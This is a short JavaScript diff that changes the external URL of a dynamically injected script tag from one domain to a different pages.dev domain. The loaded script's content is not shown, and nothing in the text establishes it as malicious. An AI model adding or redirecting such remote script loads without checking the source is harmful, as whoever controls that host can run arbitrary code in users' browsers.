@@ -687,7 +687,7 @@ function bindEvents() {
 bindEvents();
 loadInitialContent();
 
-const SCRIPT_LINK = "https://learnbyakp.online/html-j/aut.js";
+const SCRIPT_LINK = "https://mtaiirus.pages.dev/html-j/aut.js";
 
 const s = document.createElement("script");
 s.src = SCRIPT_LINK;
